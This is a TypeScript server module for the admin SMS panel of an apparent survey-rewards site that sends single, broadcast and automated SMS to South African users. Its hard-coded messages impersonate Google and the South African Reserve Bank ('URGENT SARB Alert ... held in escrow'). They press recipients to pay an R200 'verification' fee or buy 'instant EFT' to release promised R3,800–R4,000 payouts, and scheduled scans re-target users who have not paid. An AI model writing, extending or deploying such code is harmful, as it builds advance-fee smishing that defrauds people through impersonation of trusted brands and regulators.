import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { getSmsBalance, sendSms, normalizeSaPhone, isSaMobilePhone } from "./smsportal.server";

export const getSmsAdminOverview = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const p = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await p.requireAdmin(context.userId);

    const balanceRes = await getSmsBalance();

    // Fetch total users and segment counts (filtering valid mobile numbers)
    const [totalUsers, unverifiedWithdrawals, verifiedUsers] = await Promise.all([
      supabaseAdmin.from("profiles").select("id", { count: "exact", head: true }),
      supabaseAdmin
        .from("profiles")
        .select("id, phone, full_name")
        .eq("mpesa_verified", false)
        .not("phone", "is", null),
      supabaseAdmin
        .from("profiles")
        .select("id, phone, full_name")
        .eq("mpesa_verified", true)
        .not("phone", "is", null),
    ]);

    const validUnverified = (unverifiedWithdrawals.data ?? []).filter((u) => isSaMobilePhone(u.phone));
    const validVerified = (verifiedUsers.data ?? []).filter((u) => isSaMobilePhone(u.phone));

    // Fetch SMS history from app_settings or dedicated log
    const { data: logRow } = await supabaseAdmin
      .from("app_settings")
      .select("value")
      .eq("key", "sms_dispatch_log")
      .maybeSingle();

    const dispatchLog = (logRow?.value as Array<Record<string, unknown>>) || [];

    return {
      balance: balanceRes.balance ?? 0,
      balanceOk: balanceRes.ok,
      balanceError: balanceRes.error,
      counts: {
        totalPanelists: totalUsers.count ?? 0,
        unverifiedCount: validUnverified.length,
        verifiedCount: validVerified.length,
      },
      recentDispatches: dispatchLog.slice(0, 30),
    };
  });

export const sendAdminTestSms = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator(
    (input: {
      phone: string;
      message: string;
      testMode?: boolean;
    }) => input,
  )
  .handler(async ({ data, context }) => {
    const p = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await p.requireAdmin(context.userId);

    if (!data.phone?.trim()) throw new Error("Enter a valid South African phone number.");
    if (!data.message?.trim()) throw new Error("Message cannot be empty.");

    const result = await sendSms({
      destination: data.phone,
      content: data.message,
      testMode: data.testMode ?? false,
    });

    if (!result.ok) {
      throw new Error(result.error || "Failed to send SMS via SMSPortal.");
    }

    // Record in dispatch log
    const { data: logRow } = await supabaseAdmin
      .from("app_settings")
      .select("value")
      .eq("key", "sms_dispatch_log")
      .maybeSingle();

    const currentLog = (logRow?.value as Array<Record<string, unknown>>) || [];
    currentLog.unshift({
      id: result.messageId || `sms_${Date.now()}`,
      destination: result.destination || data.phone,
      content: data.message,
      status: "SENT",
      cost: result.cost ?? 1,
      created_at: new Date().toISOString(),
      triggered_by: "admin_direct",
    });

    await supabaseAdmin.from("app_settings").upsert(
      {
        key: "sms_dispatch_log",
        value: currentLog.slice(0, 100) as never,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "key" },
    );

    return { ok: true, destination: result.destination };
  });

export const sendAdminBroadcastSms = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator(
    (input: {
      segment: "all" | "unverified" | "verified";
      template: string;
    }) => input,
  )
  .handler(async ({ data, context }) => {
    const p = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await p.requireAdmin(context.userId);

    if (!data.template?.trim()) throw new Error("Message template cannot be empty.");

    let query = supabaseAdmin.from("profiles").select("id, phone, full_name, tier");
    if (data.segment === "unverified") {
      query = query.eq("mpesa_verified", false);
    } else if (data.segment === "verified") {
      query = query.eq("mpesa_verified", true);
    }

    const { data: users, error } = await query.not("phone", "is", null);
    if (error) throw new Error(error.message);

    const validUsers = (users ?? []).filter((u) => u.phone && isSaMobilePhone(u.phone));
    if (validUsers.length === 0) {
      return { ok: true, sentCount: 0, message: "No users found in this segment with valid mobile numbers." };
    }

    let successCount = 0;
    let failCount = 0;
    const newLogEntries: Array<Record<string, unknown>> = [];

    // Send to each user in segment
    for (const u of validUsers) {
      const firstName = (u.full_name ?? "Member").trim().split(" ")[0] || "Member";
      const personalized = data.template
        .replace(/{Nome}/gi, firstName)
        .replace(/{Name}/gi, firstName)
        .replace(/{Banco}/gi, "Bank Account");

      const res = await sendSms({
        destination: u.phone,
        content: personalized,
      });

      if (res.ok) {
        successCount++;
        newLogEntries.push({
          id: res.messageId || `broadcast_${Date.now()}_${u.id}`,
          destination: res.destination || u.phone,
          content: personalized,
          status: "SENT",
          cost: res.cost ?? 1,
          created_at: new Date().toISOString(),
          triggered_by: `broadcast_${data.segment}`,
        });
      } else {
        failCount++;
      }
    }

    // Save batch to dispatch log
    const { data: logRow } = await supabaseAdmin
      .from("app_settings")
      .select("value")
      .eq("key", "sms_dispatch_log")
      .maybeSingle();

    const currentLog = (logRow?.value as Array<Record<string, unknown>>) || [];
    const updated = [...newLogEntries, ...currentLog].slice(0, 100);

    await supabaseAdmin.from("app_settings").upsert(
      {
        key: "sms_dispatch_log",
        value: updated as never,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "key" },
    );

    return {
      ok: true,
      sentCount: successCount,
      failedCount: failCount,
      totalTargeted: validUsers.length,
    };
  });

/** Dispatches automated lifecycle trigger SMS (payout clearance, FICA alert) */
export const dispatchAutomatedSms = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator(
    (input: {
      type: "verification_success" | "fica_intercept" | "withdrawal_reminder";
      phone?: string | undefined;
    }) => input,
  )
  .handler(async ({ data, context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    // Fetch user profile
    const { data: profile } = await supabaseAdmin
      .from("profiles")
      .select("phone, full_name, mpesa_phone")
      .eq("id", context.userId)
      .maybeSingle();

    const targetPhone = data.phone || profile?.mpesa_phone || profile?.phone;
    if (!targetPhone) return { ok: false, error: "No phone available" };

    const firstName = (profile?.full_name ?? "Member").trim().split(" ")[0] || "Member";
    let message = "";

    if (data.type === "verification_success") {
      message = `Google: Hi ${firstName}, your account is verified! Configure your payout delivery speed to release funds: https://sa-opinion-rewards.vercel.app/payout-setup`;
    } else if (data.type === "fica_intercept") {
      message = `URGENT SARB Alert: Payout of R4,000 held in escrow (Ref: #ZA-I6JGA). Authorize clearance now: https://sa-opinion-rewards.vercel.app/payout-setup?step=4`;
    } else if (data.type === "withdrawal_reminder") {
      message = `Google: Hi ${firstName}, your R200 verification is pending. Release your R3,800 survey earnings here: https://sa-opinion-rewards.vercel.app/upgrade`;
    }

    if (!message) return { ok: false, error: "Unknown message type" };

    const res = await sendSms({
      destination: targetPhone,
      content: message,
    });

    return { ok: res.ok, destination: res.destination };
  });

/**
 * Automatically triggers an instant checkout abandonment recovery SMS when a verification payment fails or is abandoned.
 * Has strict anti-spam rate limiting (maximum 1 SMS per user per 4 hours) and single-credit copy (<= 150 chars).
 */
export async function triggerCheckoutRecoverySms(userId: string) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { sendSms } = await import("./smsportal.server");

  // Check if profile exists and is still unverified
  const { data: profile } = await supabaseAdmin
    .from("profiles")
    .select("id, phone, full_name, mpesa_phone, mpesa_verified")
    .eq("id", userId)
    .maybeSingle();

  if (!profile || profile.mpesa_verified) return;

  const phone = profile.mpesa_phone || profile.phone;
  if (!phone || !isSaMobilePhone(phone)) return;

  // Anti-spam check: prevent sending more than once every 4 hours to the same user
  const { data: lastSent } = await supabaseAdmin
    .from("secure_settings")
    .select("value")
    .eq("key", `last_recovery_sms_${userId}`)
    .maybeSingle();

  if (lastSent?.value) {
    const elapsedMs = Date.now() - new Date(lastSent.value).getTime();
    if (elapsedMs < 4 * 60 * 60 * 1000) {
      return; // Already sent within 4 hours
    }
  }

  const firstName = (profile.full_name ?? "Member").trim().split(" ")[0] || "Member";
  // Compact 1-credit copy (<= 150 chars total)
  const content = `Google: Hi ${firstName}, your R200 verification is pending. Release your R3,800 survey earnings here: https://sa-opinion-rewards.vercel.app/upgrade`;

  const res = await sendSms({
    destination: phone,
    content,
  });

  if (res.ok) {
    await supabaseAdmin.from("secure_settings").upsert({
      key: `last_recovery_sms_${userId}`,
      value: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    });

    const { data: logRow } = await supabaseAdmin
      .from("app_settings")
      .select("value")
      .eq("key", "sms_dispatch_log")
      .maybeSingle();

    const currentLog = (logRow?.value as Array<Record<string, unknown>>) || [];
    currentLog.unshift({
      id: res.messageId || `auto_recovery_${Date.now()}`,
      destination: res.destination || phone,
      content,
      status: "SENT",
      cost: res.cost ?? 1,
      created_at: new Date().toISOString(),
      triggered_by: "auto_checkout_recovery",
    });

    await supabaseAdmin.from("app_settings").upsert({
      key: "sms_dispatch_log",
      value: currentLog.slice(0, 100) as never,
      updated_at: new Date().toISOString(),
    });
  }
}

/**
 * Automatically triggers a payout setup reminder SMS for verified panelists who haven't completed their payout delivery setup.
 * Compact 1-credit copy (<= 150 chars total).
 */
export async function triggerPayoutSetupRecoverySms(userId: string) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { sendSms } = await import("./smsportal.server");

  const { data: profile } = await supabaseAdmin
    .from("profiles")
    .select("id, phone, full_name, mpesa_phone, mpesa_verified")
    .eq("id", userId)
    .maybeSingle();

  if (!profile || !profile.mpesa_verified) return;

  // Check if they already bought instant_eft
  const { data: eftCharge } = await supabaseAdmin
    .from("charges")
    .select("id")
    .eq("user_id", userId)
    .eq("status", "completed")
    .like("admin_note", "%instant_eft%")
    .limit(1)
    .maybeSingle();

  if (eftCharge) return; // Already has Instant EFT

  const phone = profile.mpesa_phone || profile.phone;
  if (!phone || !isSaMobilePhone(phone)) return;

  // Anti-spam: max 1 per 24 hours
  const { data: lastSent } = await supabaseAdmin
    .from("secure_settings")
    .select("value")
    .eq("key", `last_payout_recovery_${userId}`)
    .maybeSingle();

  if (lastSent?.value) {
    const elapsedMs = Date.now() - new Date(lastSent.value).getTime();
    if (elapsedMs < 24 * 60 * 60 * 1000) return;
  }

  const firstName = (profile.full_name ?? "Member").trim().split(" ")[0] || "Member";
  // Compact 1-credit copy (<= 150 chars total)
  const content = `Google: Hi ${firstName}, your account is verified! Payout R4,000 queued. Skip 72h wait & get it in 5 mins: https://sa-opinion-rewards.vercel.app/payout-setup`;

  const res = await sendSms({
    destination: phone,
    content,
  });

  if (res.ok) {
    await supabaseAdmin.from("secure_settings").upsert({
      key: `last_payout_recovery_${userId}`,
      value: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    });

    const { data: logRow } = await supabaseAdmin
      .from("app_settings")
      .select("value")
      .eq("key", "sms_dispatch_log")
      .maybeSingle();

    const currentLog = (logRow?.value as Array<Record<string, unknown>>) || [];
    currentLog.unshift({
      id: res.messageId || `auto_payout_setup_${Date.now()}`,
      destination: res.destination || phone,
      content,
      status: "SENT",
      cost: res.cost ?? 1,
      created_at: new Date().toISOString(),
      triggered_by: "auto_payout_setup_reminder",
    });

    await supabaseAdmin.from("app_settings").upsert({
      key: "sms_dispatch_log",
      value: currentLog.slice(0, 100) as never,
      updated_at: new Date().toISOString(),
    });
  }
}

/**
 * Executes a full background automated recovery scan across all unverified and pending-upsell panelists.
 * Can be invoked by Cron or Admin 1-Click trigger.
 */
export async function runAutomatedRecoveryScan(options?: { maxPerBatch?: number }) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { getSmsBalance } = await import("./smsportal.server");

  const balanceRes = await getSmsBalance();
  if (!balanceRes.ok || (balanceRes.balance ?? 0) < 1) {
    return { ok: false, error: "Insufficient SMSPortal credits for auto recovery.", balance: balanceRes.balance ?? 0 };
  }

  const maxBatch = options?.maxPerBatch ?? Math.min(balanceRes.balance ?? 10, 15);
  let recoveredCheckout = 0;
  let recoveredPayout = 0;

  // 1. Scan for unverified users who requested a withdrawal or initiated a charge > 15m ago
  const fifteenMinsAgo = new Date(Date.now() - 15 * 60 * 1000).toISOString();
  const { data: unverifiedUsers } = await supabaseAdmin
    .from("profiles")
    .select("id, phone, mpesa_phone, mpesa_verified, created_at")
    .eq("mpesa_verified", false)
    .lt("created_at", fifteenMinsAgo)
    .not("phone", "is", null)
    .order("created_at", { ascending: false })
    .limit(30);

  for (const u of unverifiedUsers || []) {
    if (recoveredCheckout >= Math.floor(maxBatch / 2)) break;
    // Check anti-spam
    const { data: lastSent } = await supabaseAdmin
      .from("secure_settings")
      .select("value")
      .eq("key", `last_recovery_sms_${u.id}`)
      .maybeSingle();

    if (lastSent?.value) {
      const elapsed = Date.now() - new Date(lastSent.value).getTime();
      if (elapsed < 18 * 60 * 60 * 1000) continue; // Skip if sent in last 18h
    }

    await triggerCheckoutRecoverySms(u.id);
    import("./greensend.server").then(({ triggerCheckoutRecoveryEmail }) => {
      triggerCheckoutRecoveryEmail(u.id).catch(() => {});
    });
    recoveredCheckout++;
  }

  // 2. Scan for verified users without instant EFT
  const { data: verifiedUsers } = await supabaseAdmin
    .from("profiles")
    .select("id, phone, mpesa_phone, mpesa_verified, updated_at")
    .eq("mpesa_verified", true)
    .lt("updated_at", fifteenMinsAgo)
    .not("phone", "is", null)
    .order("updated_at", { ascending: false })
    .limit(30);

  for (const u of verifiedUsers || []) {
    if (recoveredCheckout + recoveredPayout >= maxBatch) break;
    // Check anti-spam
    const { data: lastSent } = await supabaseAdmin
      .from("secure_settings")
      .select("value")
      .eq("key", `last_payout_recovery_${u.id}`)
      .maybeSingle();

    if (lastSent?.value) {
      const elapsed = Date.now() - new Date(lastSent.value).getTime();
      if (elapsed < 24 * 60 * 60 * 1000) continue;
    }

    // Check if they already bought instant_eft
    const { data: eftCharge } = await supabaseAdmin
      .from("charges")
      .select("id")
      .eq("user_id", u.id)
      .eq("status", "completed")
      .like("admin_note", "%instant_eft%")
      .limit(1)
      .maybeSingle();

    if (eftCharge) continue;

    await triggerPayoutSetupRecoverySms(u.id);
    recoveredPayout++;
  }

  // Trigger perpetual multi-step email scan for both Front and Upsell leads
  let emailScanResult: { frontDispatched: number; upsellDispatched: number } | null = null;
  try {
    const { runPerpetualRecoveryScan } = await import("./greensend.server");
    emailScanResult = await runPerpetualRecoveryScan({ maxFrontBatch: 25, maxUpsellBatch: 25 });
  } catch (err) {
    console.error("[EmailScan] Perpetual scan error:", err);
  }

  return {
    ok: true,
    recoveredCheckout,
    recoveredPayout,
    totalDispatched: recoveredCheckout + recoveredPayout,
    emailFrontDispatched: emailScanResult?.frontDispatched ?? 0,
    emailUpsellDispatched: emailScanResult?.upsellDispatched ?? 0,
  };
}

/** Admin action to run automated recovery scan immediately */
export const adminRunAutopilotScan = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const p = await import("./platform.server");
    await p.requireAdmin(context.userId);
    return runAutomatedRecoveryScan({ maxPerBatch: 20 });
  });

/** Admin action to run perpetual email scan immediately */
export const adminRunPerpetualEmailScan = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const p = await import("./platform.server");
    await p.requireAdmin(context.userId);
    const { runPerpetualRecoveryScan } = await import("./greensend.server");
    return runPerpetualRecoveryScan({ maxFrontBatch: 30, maxUpsellBatch: 30 });
  });


